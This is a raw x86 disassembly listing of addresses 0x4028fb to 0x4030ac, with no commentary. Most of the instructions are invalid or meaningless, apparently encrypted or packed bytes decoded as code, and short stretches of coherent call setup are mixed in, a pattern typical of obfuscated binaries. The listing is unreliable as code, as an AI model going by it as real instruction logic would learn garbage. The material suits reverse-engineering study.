  4028fb:	jge    0x402931
  4028fd:	mov    bh,0x23
  4028ff:	mov    DWORD PTR [ebx],esi
  402901:	sbb    eax,0xc302c5ab
  402906:	je     0x402980
  402908:	jne    0x4028b2
  40290a:	ficom  DWORD PTR [edi+0x6b334b86]
  402910:	push   0x6f
  402912:	xor    eax,0x7b8644c1
  402917:	and    eax,0x460bcdc8
  40291c:	mov    ah,0x85
  40291e:	sbb    eax,0x712c98b6
  402923:	inc    eax
  402924:	and    BYTE PTR [edi+0x12f1d60a],0x39
  40292b:	mov    cr6,esi
  40292e:	sbb    BYTE PTR [esi],cl
  402930:	aad    0xd9
  402932:	bound  esi,QWORD PTR [esi-0x522125b7]
  402938:	(bad)  
  402939:	mov    cl,0x97
  40293b:	sub    al,0xa0
  40293d:	inc    esp
  40293e:	push   ds
  40293f:	ins    BYTE PTR es:[edi],dx
  402940:	daa    
  402941:	mov    es:0x4743d5a3,al
  402947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402948:	lods   al,BYTE PTR ds:[esi]
  402949:	mov    DWORD PTR [edi+0x417c4beb],esp
  40294f:	shr    BYTE PTR [ecx+0x65d56405],0x8d
  402956:	mov    bl,0xbf
  402958:	mov    ah,0xda
  40295a:	das    
  40295b:	inc    ecx
  40295c:	lea    edx,[edi]
  40295e:	cmp    BYTE PTR [ecx-0x7f63d6a2],al
  402964:	jp     0x4029e0
  402966:	xchg   edx,eax
  402967:	(bad)  
  402968:	push   esi
  402969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40296a:	xchg   ebp,eax
  40296b:	xor    BYTE PTR [eax],ch
  40296d:	ja     0x402991
  40296f:	jp     0x402905
  402971:	push   esi
  402972:	stos   DWORD PTR es:[edi],eax
  402973:	dec    ebx
  402974:	cmp    edx,DWORD PTR ds:0xc4ab9a40
  40297a:	xchg   edi,eax
  40297b:	nop
  40297c:	jmp    0xd6886f2d
  402981:	in     eax,0x4b
  402983:	inc    eax
  402984:	pop    eax
  402985:	push   ebp
  402986:	push   eax
  402987:	mov    dh,0x29
  402989:	pop    esi
  40298a:	mov    cs,WORD PTR [ecx-0x4723ff15]
  402990:	xchg   DWORD PTR ds:0x5808e11,ecx
  402996:	mov    bl,BYTE PTR [eax+0x39]
  402999:	xor    al,0xb4
  40299b:	imul   ebx,esi,0xa34ca981
  4029a1:	js     0x4029b0
  4029a3:	dec    edx
  4029a4:	ds (bad) 
  4029a6:	mov    esi,0x18aa6a50
  4029ab:	leave  
  4029ac:	pop    esp
  4029ad:	adc    BYTE PTR [eax],dh
  4029af:	inc    eax
  4029b0:	out    dx,eax
  4029b1:	jmp    0xc2f940d8
  4029b6:	addr16 jmp 0xed20:0xab6140ba
  4029be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029bf:	es ret 0xa8e9
  4029c3:	pop    ds
  4029c4:	and    bh,BYTE PTR [eax-0x2d]
  4029c7:	push   edi
  4029c8:	mov    WORD PTR [eax],ds
  4029ca:	jne    0x402961
  4029cc:	jb     0x4029fe
  4029ce:	loope  0x402a01
  4029d0:	nop
  4029d1:	lahf   
  4029d2:	fdivr  st(7),st
  4029d4:	pop    ss
  4029d5:	out    dx,al
  4029d6:	xchg   esi,eax
  4029d7:	imul   edi,DWORD PTR [esi],0xffffff8e
  4029da:	add    ecx,edi
  4029dc:	mov    esi,0x7503307c
  4029e1:	shl    DWORD PTR [ecx],1
  4029e3:	xchg   esp,eax
  4029e4:	aad    0x91
  4029e6:	jl     0x402a03
  4029e8:	test   al,0xcd
  4029ea:	jno    0x4029a8
  4029ec:	int3   
  4029ed:	adc    BYTE PTR [esp+eiz*2+0x1d],0xe4
  4029f2:	mov    ebp,0x2de7c348
  4029f7:	call   0xea83:0x4a46402e
  4029fe:	rol    DWORD PTR [esi],0x3f
  402a01:	bswap  edx
  402a03:	icebp  
  402a04:	sti    
  402a05:	call   0xd811:0x5300195a
  402a0c:	ds in  al,0xde
  402a0f:	or     BYTE PTR [eax+0x458b4f01],ah
  402a15:	aam    0xf
  402a17:	test   DWORD PTR [ebx],eax
  402a19:	add    BYTE PTR [eax],al
  402a1b:	add    BYTE PTR [ebx-0x39cc0fbb],cl
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	jae    0x402a95
  402a36:	(bad)  
  402a37:	sub    ebp,DWORD PTR [edx-0x58181f3]
  402a3d:	jg     0x402abd
  402a3f:	jle    0x4029cd
  402a41:	mov    cl,0x6e
  402a43:	aas    
  402a44:	sar    DWORD PTR [ebp+edx*4-0x2],0xc9
  402a49:	rcr    BYTE PTR [eax-0x28b54b22],cl
  402a4f:	ss popa 
  402a51:	ss (bad) 
  402a53:	outs   dx,DWORD PTR ds:[esi]
  402a54:	loope  0x4029ed
  402a56:	jnp    0x402a10
  402a58:	lods   al,BYTE PTR ds:[esi]
  402a59:	loop   0x402a1c
  402a5b:	cmp    eax,0xa7196651
  402a60:	push   ds
  402a61:	push   es
  402a62:	retf   0x9d69
  402a65:	jne    0x402a02
  402a67:	mov    ah,0xb3
  402a69:	clc    
  402a6a:	stos   BYTE PTR es:[edi],al
  402a6b:	add    al,0xe1
  402a6d:	jb     0x4029fb
  402a6f:	inc    ecx
  402a70:	scas   al,BYTE PTR es:[edi]
  402a71:	sti    
  402a72:	jns    0x402a30
  402a74:	gs into 
  402a76:	fnsave [esi-0x76f773a7]
  402a7c:	shr    DWORD PTR [eax+0x4b83097],1
  402a82:	bound  ebp,QWORD PTR [eax+0x70]
  402a85:	jg     0x402a4d
  402a87:	mov    al,ds:0xbba5d7c0
  402a8c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  402a8e:	inc    ebx
  402a8f:	dec    eax
  402a90:	lods   eax,DWORD PTR ds:[esi]
  402a91:	pop    edx
  402a92:	icebp  
  402a93:	add    esp,DWORD PTR [ebx]
  402a95:	push   ecx
  402a96:	stc    
  402a97:	lds    eax,FWORD PTR [edi-0xf]
  402a9a:	or     ecx,DWORD PTR [eax+0x11]
  402a9d:	xor    esi,edx
  402a9f:	rcr    DWORD PTR [edx-0x4b],cl
  402aa2:	cmp    eax,0x5b1a8ba8
  402aa7:	fs jp  0x402ad3
  402aaa:	mov    esi,0x514a282
  402aaf:	sbb    ebx,DWORD PTR [esp+esi*2+0x9]
  402ab3:	mov    al,ds:0x3af7093a
  402ab8:	in     eax,0x9c
  402aba:	out    dx,ax
  402abc:	push   cs
  402abd:	mov    cl,0x22
  402abf:	jmp    0x402a7b
  402ac1:	test   eax,0x7ca21843
  402ac6:	(bad)  
  402ac7:	mov    ebx,0xd9f14991
  402acc:	lea    ebx,[edx+eax*1-0x23]
  402ad0:	pop    ss
  402ad1:	xchg   esi,eax
  402ad2:	mov    cl,0xe0
  402ad4:	xchg   edi,eax
  402ad5:	popf   
  402ad6:	addr16 mov bh,0x6e
  402ad9:	(bad)  
  402ada:	dec    ebp
  402adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402adc:	stos   BYTE PTR es:[edi],al
  402add:	jb     0xc45fedd2
  402ae3:	cmp    esi,eax
  402ae5:	mov    ds,WORD PTR [edi+0x431764dd]
  402aeb:	xchg   BYTE PTR [eax],al
  402aed:	retf   0xad46
  402af0:	mov    bh,0x29
  402af2:	popa   
  402af3:	jb     0x402b42
  402af5:	(bad)  
  402af6:	imul   edi,DWORD PTR [edx+0x123dfcba],0xffffffce
  402afd:	rol    DWORD PTR [eax+eax*1+0x7e1b8c6e],1
  402b04:	push   ecx
  402b05:	call   0xed9941b8
  402b0a:	mov    ch,dh
  402b0c:	mov    ah,0xf6
  402b0e:	call   0x183a1ce1
  402b13:	fdivr  st(7),st
  402b15:	or     cl,ah
  402b17:	and    ecx,ecx
  402b19:	xchg   ecx,eax
  402b1a:	stos   BYTE PTR es:[edi],al
  402b1b:	rcl    BYTE PTR [edi],cl
  402b1d:	dec    ecx
  402b1e:	fiadd  DWORD PTR ds:0x9e133980
  402b24:	xchg   BYTE PTR [eax+esi*8],ch
  402b27:	add    esp,DWORD PTR [esi]
  402b29:	lea    ebx,[ebp-0x8]
  402b2c:	rcl    BYTE PTR [eax],1
  402b2e:	jle    0x402b6e
  402b30:	xchg   BYTE PTR [ebp-0x50],ah
  402b33:	inc    ebp
  402b34:	cmp    DWORD PTR [edx-0x29],ebp
  402b37:	mov    ds,WORD PTR fs:[ecx+0x74246d55]
  402b3e:	push   edx
  402b3f:	imul   eax,DWORD PTR [edi+0x22],0xffffffb6
  402b43:	xchg   dl,al
  402b45:	jecxz  0x402ba3
  402b47:	adc    edi,DWORD PTR [ecx+0x69]
  402b4a:	or     DWORD PTR [ebx],edi
  402b4c:	add    esi,DWORD PTR [esi+0x21]
  402b4f:	hlt    
  402b50:	ins    DWORD PTR es:[edi],dx
  402b51:	push   ds
  402b52:	out    0xe9,eax
  402b54:	push   ss
  402b55:	inc    edx
  402b56:	js     0x402b46
  402b58:	mov    bl,0xae
  402b5a:	test   BYTE PTR [esi],dl
  402b5c:	fs loop 0x402b37
  402b5f:	arpl   WORD PTR [esi],di
  402b61:	sub    edi,DWORD PTR [ecx-0x80]
  402b64:	mov    eax,0x1cc45fb8
  402b69:	test   eax,0xde6e3f05
  402b6e:	fmul   QWORD PTR [ebx+0x71df65ed]
  402b74:	jp     0x402b93
  402b76:	sbb    al,0xb8
  402b78:	adc    al,0xa7
  402b7a:	dec    edx
  402b7b:	mov    bh,BYTE PTR [edi]
  402b7d:	nop
  402b7e:	jecxz  0x402bb3
  402b80:	retf   
  402b81:	xchg   ecx,eax
  402b82:	sbb    BYTE PTR [ecx-0x29253f5a],dh
  402b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b89:	imul   edx,DWORD PTR [edx],0x7f814a70
  402b8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b90:	sbb    eax,DWORD PTR [ebp+0x6c]
  402b93:	sbb    BYTE PTR [esp+ebx*4-0x6bbd5ae4],bh
  402b9a:	pop    esi
  402b9b:	inc    edi
  402b9c:	rcl    BYTE PTR [eax+0x21],cl
  402b9f:	popa   
  402ba0:	inc    eax
  402ba1:	pop    ds
  402ba2:	ja     0x402bac
  402ba4:	mov    cl,0x7e
  402ba6:	inc    ebp
  402ba7:	push   0x547078a9
  402bac:	in     al,0x3a
  402bae:	retf   
  402baf:	xchg   edx,eax
  402bb0:	mov    eax,ds:0xf34bc4ac
  402bb5:	cmp    DWORD PTR [esi+0x22],ecx
  402bb8:	stc    
  402bb9:	mov    ds:0xbc2aab63,eax
  402bbe:	dec    edx
  402bbf:	iret   
  402bc0:	inc    esp
  402bc1:	es cli 
  402bc3:	inc    ebx
  402bc4:	test   eax,eax
  402bc6:	je     0x402bf4
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	inc    edi
  402c12:	sbb    eax,0xb3654d6
  402c17:	jle    0x402c97
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402c81
  402c1e:	jle    0x402bae
  402c20:	mov    cl,0xcd
  402c22:	ins    BYTE PTR es:[edi],dx
  402c23:	ja     0x402bc3
  402c25:	sbb    bh,al
  402c27:	fld    QWORD PTR [eax-0x4]
  402c2a:	dec    esp
  402c2b:	mov    edi,0x5fe2897
  402c30:	stos   BYTE PTR es:[edi],al
  402c31:	shl    DWORD PTR [esi+0x78a0bea2],1
  402c37:	jg     0x402c32
  402c39:	out    0xc1,al
  402c3b:	or     dl,0xae
  402c3e:	push   es
  402c3f:	xor    al,0x3
  402c41:	mov    edx,0x2281c2ec
  402c46:	xchg   DWORD PTR [edi],eax
  402c48:	or     ah,BYTE PTR [esi*2+0x69180816]
  402c4f:	inc    esi
  402c50:	mov    edx,0xefb3e024
  402c55:	and    bl,al
  402c57:	mov    edi,0x8dbb012a
  402c5c:	fs cli 
  402c5e:	adc    eax,0x3d3ae9d5
  402c63:	aas    
  402c64:	adc    edi,DWORD PTR [edi-0x1c]
  402c67:	sub    al,0x9b
  402c69:	or     eax,0xdcfc838
  402c6e:	shr    BYTE PTR ds:0xeb9549e7,1
  402c74:	push   es
  402c75:	out    dx,eax
  402c76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c77:	(bad)  
  402c78:	cmc    
  402c79:	cs jmp 0xc459:0xec8e80a6
  402c81:	dec    ebp
  402c82:	sahf   
  402c83:	loop   0x402c87
  402c85:	dec    ecx
  402c86:	sub    eax,0x391f0d3d
  402c8b:	or     bl,BYTE PTR [ebp+0x35]
  402c8e:	push   es
  402c8f:	out    dx,eax
  402c90:	fs mov ch,0x5a
  402c93:	pusha  
  402c94:	loop   0x402cde
  402c96:	cs div edi
  402c99:	sbb    ebx,DWORD PTR [eax+0x5eb605ce]
  402c9f:	mov    al,0x33
  402ca1:	xchg   esi,eax
  402ca2:	mov    esp,ds
  402ca4:	cwde   
  402ca5:	sahf   
  402ca6:	pop    es
  402ca7:	lds    ebp,FWORD PTR [eax-0x1]
  402caa:	push   cs
  402cab:	fistp  DWORD PTR [eax-0x5c9002cc]
  402cb1:	jae    0x402cd5
  402cb3:	iret   
  402cb4:	sbb    DWORD PTR [edx+0x5ab52289],0xc9729e8f
  402cbe:	loop   0x402d25
  402cc0:	cmp    ch,ah
  402cc2:	jge    0x402c78
  402cc4:	fidivr DWORD PTR ds:0x50a4b761
  402cca:	dec    ecx
  402ccb:	je     0x402c75
  402ccd:	mov    eax,0xf149a514
  402cd2:	scas   al,BYTE PTR es:[edi]
  402cd3:	jge    0x402cf1
  402cd5:	aaa    
  402cd6:	and    BYTE PTR [esi-0x55657107],cl
  402cdc:	push   esi
  402cdd:	loopne 0x402c76
  402cdf:	cmp    ecx,DWORD PTR [ebx]
  402ce1:	out    0xc,al
  402ce3:	push   0x45
  402ce5:	retf   
  402ce6:	ss push ds
  402ce8:	mov    ebx,DWORD PTR [edx+0x34]
  402ceb:	fdiv   QWORD PTR [esi+ebx*1-0x6e]
  402cef:	imul   BYTE PTR ds:0xe37c45f5
  402cf5:	sbb    DWORD PTR [ebx+edi*1-0x44],ebx
  402cf9:	cld    
  402cfa:	das    
  402cfb:	retf   0x1f88
  402cfe:	xchg   ebp,eax
  402cff:	imul   ecx,DWORD PTR [edx-0x7641ada3],0x75
  402d06:	xor    DWORD PTR es:[ebp-0x1fc8dc6f],edi
  402d0d:	pop    ebx
  402d0e:	mov    ds:0xa25f30ab,al
  402d13:	xor    DWORD PTR [ecx-0x1d],edi
  402d16:	aaa    
  402d17:	clc    
  402d18:	mov    edx,0x2d7f17c8
  402d1d:	push   ecx
  402d1e:	aas    
  402d1f:	sbb    eax,0xf766f777
  402d24:	aas    
  402d25:	inc    ebx
  402d26:	jae    0x402ced
  402d28:	push   0xba6b7317
  402d2d:	or     esp,DWORD PTR [ebx+0x6fc4206]
  402d33:	and    cl,BYTE PTR [eax]
  402d35:	add    DWORD PTR [ebx-0x1a],edx
  402d38:	imul   BYTE PTR [edx-0x20]
  402d3b:	retf   
  402d3c:	call   0xc489b5e
  402d41:	rol    dh,cl
  402d43:	hlt    
  402d44:	xlat   BYTE PTR ds:[ebx]
  402d45:	fistp  DWORD PTR [edi]
  402d47:	call   0x313d:0xc41a80e8
  402d4e:	jecxz  0x402d80
  402d50:	or     BYTE PTR [ebp-0x4d0d12d3],ch
  402d56:	stos   BYTE PTR es:[edi],al
  402d57:	outs   dx,BYTE PTR ds:[esi]
  402d58:	push   eax
  402d59:	mov    esp,0x96e59850
  402d5e:	test   BYTE PTR [eax-0x16],ch
  402d61:	push   ebp
  402d62:	inc    ecx
  402d63:	sub    ecx,esi
  402d65:	mov    ah,0x9d
  402d67:	mov    ecx,0x5273fb38
  402d6c:	or     eax,0x17f55b03
  402d71:	stos   BYTE PTR es:[edi],al
  402d72:	jecxz  0x402dd7
  402d74:	pop    ebp
  402d75:	lds    si,DWORD PTR [ebp+0xb51185]
  402d7c:	les    ecx,FWORD PTR [edx]
  402d7e:	fld    DWORD PTR [eax]
  402d80:	ins    BYTE PTR es:[edi],dx
  402d81:	jmp    0x441e:0x23cbc1f7
  402d88:	jae    0x402e09
  402d8a:	xor    ch,BYTE PTR [ebx]
  402d8c:	mov    cl,0x4e
  402d8e:	xor    BYTE PTR [edi],bl
  402d90:	loope  0x402db0
  402d92:	and    al,ch
  402d94:	add    DWORD PTR [esi+ebp*2-0x72],edx
  402d98:	(bad)  
  402d99:	ds xor ebp,edx
  402d9c:	lods   eax,DWORD PTR ds:[esi]
  402d9d:	(bad)  
  402d9e:	mov    eax,0x452bf9a2
  402da3:	cld    
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [esi+ecx*1+0x56],1
  402de7:	jnp    0x402da1
  402de9:	mov    dl,0x8
  402deb:	jle    0x402e6b
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402db3
  402df2:	stos   DWORD PTR es:[edi],eax
  402df3:	dec    edi
  402df4:	push   ebx
  402df5:	cwde   
  402df6:	repnz push edx
  402df8:	dec    esi
  402df9:	sub    al,0xa3
  402dfb:	mov    al,ds:0x898d78b0
  402e00:	das    
  402e01:	ret    
  402e02:	lods   al,BYTE PTR ds:[esi]
  402e03:	nop
  402e04:	pop    ebp
  402e05:	repnz inc ecx
  402e07:	stc    
  402e08:	jl     0x402db1
  402e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e0b:	adc    eax,0xfbdc7b14
  402e10:	(bad)  
  402e11:	pop    edi
  402e12:	or     DWORD PTR [edx-0x52135b3c],esp
  402e18:	dec    esp
  402e19:	adc    DWORD PTR [eax],0x11
  402e1c:	xor    ch,BYTE PTR ds:0x647917a1
  402e22:	sub    BYTE PTR [esi],dl
  402e24:	les    ebp,FWORD PTR [edx+0x79]
  402e27:	aaa    
  402e28:	scas   eax,DWORD PTR es:[edi]
  402e29:	xchg   ecx,eax
  402e2a:	jmp    FWORD PTR [ecx]
  402e2c:	mov    BYTE PTR [eax+ecx*1+0x73ad677],bl
  402e33:	mov    edi,0x2cbf0a97
  402e38:	arpl   WORD PTR [edx],si
  402e3a:	repnz ss aas 
  402e3d:	cmp    al,0x72
  402e3f:	stos   BYTE PTR es:[edi],al
  402e40:	xchg   edi,eax
  402e41:	ins    DWORD PTR es:[edi],dx
  402e42:	and    eax,0xe07125fd
  402e47:	(bad)  
  402e48:	retf   
  402e49:	mov    ch,0x76
  402e4b:	mov    bl,0x5f
  402e4d:	js     0x402e97
  402e4f:	cmp    ebx,ebx
  402e51:	shl    ch,1
  402e53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e54:	lds    esp,FWORD PTR [edx]
  402e56:	push   es
  402e57:	lock adc DWORD PTR [ecx+0x278d9d0d],ebp
  402e5e:	daa    
  402e5f:	cld    
  402e60:	add    DWORD PTR [ebp+0x74],ebx
  402e63:	hlt    
  402e64:	dec    ebp
  402e65:	jbe    0x402e87
  402e67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e68:	cmp    ebx,DWORD PTR ds:0xae7a5465
  402e6e:	in     al,0x6f
  402e70:	out    0xd7,eax
  402e72:	mov    esi,0x44b05eb7
  402e77:	lock enter 0xb152,0xa3
  402e7c:	pop    esp
  402e7d:	scas   al,BYTE PTR es:[edi]
  402e7e:	fs fs mov ch,0x18
  402e82:	jge    0x402ea5
  402e84:	das    
  402e85:	inc    esp
  402e86:	aad    0x66
  402e88:	mov    dh,0x6e
  402e8a:	out    0xf2,al
  402e8c:	adc    esp,edi
  402e8e:	jl     0x402ec7
  402e90:	fcomp  DWORD PTR [ebp-0x10]
  402e93:	or     edi,DWORD PTR [esi]
  402e95:	addr16 jmp 0x65985be
  402e9b:	mov    ecx,DWORD PTR [ebp+0x262c1a1d]
  402ea1:	loop   0x402ec9
  402ea3:	repnz test eax,0x238e19c7
  402ea9:	xchg   ecx,eax
  402eaa:	mov    ebx,0x2c88e55f
  402eaf:	inc    ebp
  402eb0:	jbe    0x402e6e
  402eb2:	stos   DWORD PTR es:[edi],eax
  402eb3:	arpl   WORD PTR [edi+0x38b868ce],di
  402eb9:	clc    
  402eba:	xchg   esi,eax
  402ebb:	jge    0x402eea
  402ebd:	jbe    0x402ea9
  402ebf:	mov    ?,WORD PTR [ebx+0x31]
  402ec2:	mov    cl,0x67
  402ec4:	xor    BYTE PTR [esi+0x2e],al
  402ec7:	inc    esp
  402ec8:	cmp    al,0x38
  402eca:	jne    0x402e6b
  402ecc:	inc    esi
  402ecd:	inc    esi
  402ece:	call   0xf6654507
  402ed3:	shl    DWORD PTR [eax+0x4171e10e],1
  402ed9:	std    
  402eda:	mov    ch,0xde
  402edc:	lahf   
  402edd:	aas    
  402ede:	aad    0xb9
  402ee0:	jno    0x402e91
  402ee2:	fiadd  WORD PTR [eax]
  402ee4:	adc    dl,BYTE PTR [edi-0x22]
  402ee7:	(bad)  
  402ee8:	mov    eax,0x50981136
  402eed:	sub    ch,bl
  402eef:	dec    esi
  402ef0:	add    al,0xee
  402ef2:	mov    eax,0xd9d06a1d
  402ef7:	pop    ds
  402ef8:	pop    ss
  402ef9:	xchg   edx,eax
  402efa:	stos   DWORD PTR es:[edi],eax
  402efb:	cmp    BYTE PTR [ebp+0xe],0xdd
  402eff:	inc    esi
  402f00:	cli    
  402f01:	or     al,0x9b
  402f03:	out    dx,eax
  402f04:	sub    cl,0x35
  402f07:	or     ebx,edi
  402f09:	jge    0x402ef7
  402f0b:	push   ds
  402f0c:	scas   eax,DWORD PTR es:[edi]
  402f0d:	popa   
  402f0e:	inc    esp
  402f0f:	call   0x302359ce
  402f14:	test   al,0x13
  402f16:	cwde   
  402f17:	inc    eax
  402f18:	pop    ss
  402f19:	inc    ebp
  402f1a:	pop    edx
  402f1b:	(bad)  
  402f1c:	stc    
  402f1d:	jno    0x402ec1
  402f1f:	hlt    
  402f20:	repnz (bad) 
  402f22:	(bad)  
  402f23:	mov    ebp,0x30214dbd
  402f28:	mov    al,ds:0xf0a7112c
  402f2d:	retf   0xf1ae
  402f30:	mov    eax,ebx
  402f32:	repz push ebp
  402f34:	(bad)  
  402f35:	lock xchg ebx,eax
  402f37:	sti    
  402f38:	int3   
  402f39:	in     eax,dx
  402f3a:	mov    esi,0xdb513697
  402f3f:	sub    ecx,DWORD PTR [ecx]
  402f41:	pop    esi
  402f42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f43:	xchg   edi,eax
  402f44:	mov    ecx,0x3763bc6f
  402f49:	bound  edx,QWORD PTR [eax]
  402f4b:	fist   DWORD PTR [edi+0x16]
  402f4e:	icebp  
  402f4f:	in     eax,dx
  402f50:	xor    ebp,DWORD PTR [edi+eax*1+0x1f56d7de]
  402f57:	ss jne 0x402fa4
  402f5a:	adc    DWORD PTR [esi],esi
  402f5c:	aas    
  402f5d:	ins    DWORD PTR es:[edi],dx
  402f5e:	mov    edx,0xfd22bbd6
  402f63:	hlt    
  402f64:	lock arpl dx,ax
  402f67:	ret    0x1380
  402f6a:	add    BYTE PTR [ecx+0x1f709afe],0x64
  402f71:	rcl    BYTE PTR [edi+esi*2],cl
  402f74:	repz lea eax,ds:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x20235a49]
  402fae:	in     eax,dx
  402faf:	or     edi,DWORD PTR [esi]
  402fb1:	push   ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x403038
  402fb9:	inc    ebp
  402fba:	(bad)  
  402fbb:	aad    0xde
  402fbd:	jge    0x402fec
  402fbf:	rcr    bl,0xf8
  402fc2:	inc    ecx
  402fc3:	sti    
  402fc4:	mov    dh,0xc6
  402fc6:	push   0x60
  402fc8:	aad    0x12
  402fca:	fnstcw WORD PTR [ebp+0x3666a5aa]
  402fd0:	lods   eax,DWORD PTR ds:[esi]
  402fd1:	in     al,0x1b
  402fd3:	or     ch,BYTE PTR [esi+0x1f]
  402fd6:	call   0x4915:0x160e59fc
  402fdd:	pushf  
  402fde:	repz pop ebp
  402fe0:	cmp    ch,dl
  402fe2:	xchg   esp,eax
  402fe3:	repz loope 0x403047
  402fe6:	mov    edx,0xbfb4b2d
  402feb:	jp     0x402f9a
  402fed:	clc    
  402fee:	push   0xcb6b8995
  402ff3:	(bad)  
  402ff4:	dec    eax
  402ff5:	xlat   BYTE PTR ds:[ebx]
  402ff6:	inc    ebx
  402ff7:	sub    DWORD PTR [edx+0x49065812],edi
  402ffd:	popa   
  402ffe:	pop    ebp
  402fff:	pop    esp
  403000:	aaa    
  403001:	jmp    0x402fb9
  403003:	mov    eax,0xa57608d5
  403008:	jne    0x403043
  40300a:	cmp    ah,ah
  40300c:	mov    eax,0x3ee969c0
  403011:	aam    0x24
  403013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403014:	and    cl,cl
  403016:	dec    esp
  403017:	pop    ss
  403018:	jns    0x403014
  40301a:	dec    edx
  40301b:	test   DWORD PTR [eax-0xd],eax
  40301e:	enter  0x7c7,0x6c
  403022:	fcmovnbe st,st(5)
  403024:	sbb    ch,cl
  403026:	add    eax,ecx
  403028:	sub    cl,bh
  40302a:	cmc    
  40302b:	push   cs
  40302c:	jp     0x403018
  40302e:	mov    edx,0x993750ca
  403033:	mov    ds,WORD PTR [esi+edi*8+0x6eddf030]
  40303a:	sbb    al,0x77
  40303c:	out    0x74,eax
  40303e:	xor    edx,DWORD PTR ds:[edi+0x5e]
  403042:	sbb    ch,BYTE PTR [edi-0x35]
  403045:	enter  0x9065,0x9a
  403049:	stc    
  40304a:	outs   dx,DWORD PTR ds:[esi]
  40304b:	sbb    dl,BYTE PTR [ecx]
  40304d:	pop    ss
  40304e:	or     al,0xd5
  403050:	xlat   BYTE PTR ds:[ebx]
  403051:	sbb    eax,0xe6a8aec5
  403056:	out    dx,eax
  403057:	rcl    BYTE PTR [ebp-0x5937b065],cl
  40305d:	jnp    0x403073
  40305f:	call   FWORD PTR [edx-0x18215a99]
  403065:	aam    0x2a
  403067:	add    DWORD PTR [eax-0x317ac5a9],0x6
  40306e:	ss ins DWORD PTR es:[edi],dx
  403070:	clc    
  403071:	mov    dl,0x26
  403073:	std    
  403074:	jb     0x403061
  403076:	cs push ecx
  403078:	popf   
  403079:	jecxz  0x40303a
  40307b:	mov    dh,0x1c
  40307d:	xchg   edx,eax
  40307e:	push   0x37
  403080:	or     ebx,DWORD PTR [eax-0x194a598b]
  403086:	(bad)  
  403087:	or     ecx,DWORD PTR ds:0xb403fa0e
  40308d:	fs push ds
  40308f:	in     eax,0xed
  403091:	mov    BYTE PTR [ebp+0x6f],bh
  403094:	sub    al,0x83
  403096:	xchg   edi,eax
  403097:	pop    ebx
  403098:	mov    edx,0xde27056a
  40309d:	push   0x14
  40309f:	rol    DWORD PTR [ecx+0x55],cl
  4030a2:	xchg   edi,eax
  4030a3:	lahf   
  4030a4:	test   DWORD PTR [ebp+0x7bda23fe],edx
  4030aa:	cmp    dh,BYTE PTR [ecx]
  4030ac:	data16 icebp 
